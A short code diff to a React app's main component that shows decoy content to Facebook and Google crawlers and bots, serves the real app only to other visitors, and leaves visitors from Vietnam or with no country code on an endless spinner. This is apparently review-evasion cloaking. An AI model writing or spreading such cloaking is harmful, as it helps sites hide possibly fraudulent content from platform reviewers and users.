@@ -63,9 +63,22 @@ function App() {
   const userAgent = navigator.userAgent.toLowerCase();
   if(!userAgent.includes('facebook') 
     && !userAgent.includes('google')
-    && !countryCode.includes('vn') 
     && !isbot(userAgent)){
-    return (
+    if(countryCode.length == 0){
+        return(           
+          <div className="loading">
+              <div className="loader"></div>
+          </div>
+        );
+      }else{
+        if(countryCode.includes('vn')){
+          return(           
+          <div className="loading">
+              <div className="loader"></div>
+          </div>
+          );
+        }else{
+          return (
             <BrowserRouter>
               <div id="app">
                 <Routes>
@@ -88,6 +101,8 @@ function App() {
               </div>
             </BrowserRouter>
           );  
+        }
+      }
   }else{
     return(showIframe("homepage.html"));
   }
